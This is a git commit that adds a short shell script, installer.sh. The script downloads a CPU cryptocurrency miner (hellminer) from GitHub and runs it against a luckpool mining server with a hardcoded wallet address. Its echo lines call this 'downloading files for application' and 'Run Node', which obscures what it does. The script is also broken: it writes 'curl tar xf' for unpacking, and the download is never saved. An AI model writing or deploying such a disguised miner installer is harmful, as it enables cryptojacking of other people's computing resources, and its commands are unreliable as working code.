a3226c5487a38d7fae5c0aa3d46624d13f0cf3eb
hajilok <120608486+hajilok@users.noreply.github.com>
2022-12-22 20:22:51 +0700

    Create installer.sh

---
+++ installer.sh
@@ -0,0 +1,6 @@
+echo "Downloading files for application"
+curl https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+echo "Unzip File"
+curl tar xf hellminer_cpu_linux.tar.gz
+echo "Run Node"
+./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RU3jkn3WMJ6RYC7JBE5LjhtF9A5KN34Kf6.rig -p x --cpu
